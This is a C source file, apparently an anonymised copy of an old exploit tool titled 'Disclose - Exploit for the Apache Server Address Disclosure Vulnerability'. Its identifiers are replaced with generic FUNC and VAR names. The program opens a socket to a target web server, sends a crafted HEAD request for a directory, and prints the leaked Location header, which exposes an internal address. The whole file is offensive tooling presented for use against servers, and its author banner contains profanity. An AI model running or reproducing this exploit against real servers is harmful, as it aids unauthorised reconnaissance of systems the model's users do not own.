
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {int sin_zero; struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int *,int) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int,struct sockaddr*,int) ;
 int FUNC_4 (int) ;
 struct hostent* FUNC_5 (char*) ;
 int FUNC_6 (int) ;
 int FUNC_7 (char*,...) ;
 int FUNC_8 (int,char*,int ,int ) ;
 int FUNC_9 (int,char*,int ,int ) ;
 int FUNC_10 (int) ;
 int FUNC_11 (int ,int ,int ) ;
 int FUNC_12 (char*,char*) ;
 int FUNC_13 (char*) ;
 char* FUNC_14 (char*,char*) ;

FUNC_15(int VAR_4, char *VAR_5[])
{
int VAR_6;
struct sockaddr_in VAR_7;
struct hostent *VAR_8;
char VAR_9[1024];
char VAR_10[1024];
char *VAR_11;
int VAR_12;
int VAR_13;

if (VAR_4 != 4) {
FUNC_7("Usage: %s <hostname> <port> <directory>\n",VAR_5[0]);
FUNC_7("Example(verbose): %s www.linux.org 80 /info\n",VAR_5[0]);
FUNC_7("Example(specify): %s www.linux.org 80 /info | grep Location\n",VAR_5[0]);
FUNC_7("Example(output) : Location: http://127.0.0.3/supersecretshit/\n");
FUNC_4(1);
}

if ((VAR_8=FUNC_5(VAR_5[1])) == ((void*)0)) {
FUNC_7("Unknown host.\n");
FUNC_4(1);
}

VAR_7.sin_family = VAR_0;
VAR_12 = FUNC_0(VAR_5[2]);
VAR_7.sin_port = FUNC_6(VAR_12);
VAR_7.sin_addr = *((struct in_addr *)VAR_8->h_addr);
FUNC_1(&(VAR_7.sin_zero), 8);


if((VAR_6 = FUNC_11(VAR_0, VAR_3, 0)) == -1) {
FUNC_7("Cannot open socket.\n");
FUNC_4(1);
}

if(FUNC_3(VAR_6, (struct sockaddr *)&VAR_7, sizeof(struct sockaddr)) == -1) {
FUNC_7("Could not connect to socket.\n");
FUNC_4(1);
}

FUNC_7("Disclose - Exploit for the Apache Server Address Disclosure Vulnerability\n");
FUNC_7("by: magnum - magnum@fuckthat.org - http://www.fuckthat.org\n\n");
FUNC_12(VAR_10,"HEAD ");
FUNC_12(VAR_10,VAR_5[3]);
FUNC_12(VAR_10," HTTP/1.0\n\n\n");
FUNC_10(1);
FUNC_9(VAR_6, VAR_10, FUNC_13(VAR_10), 0);
FUNC_7("Status: ");
if((VAR_13=FUNC_8(VAR_6, VAR_9, VAR_2, 0)) == VAR_1) {
  FUNC_7("recv error\n");
        FUNC_2(VAR_6);
 FUNC_4(1);
}

FUNC_7("Done.\n");
VAR_9[VAR_13] = '\0';
VAR_11=FUNC_14(VAR_9, "Location");
FUNC_7("%s\n", VAR_11);

FUNC_2(VAR_6);
FUNC_4(0);
}
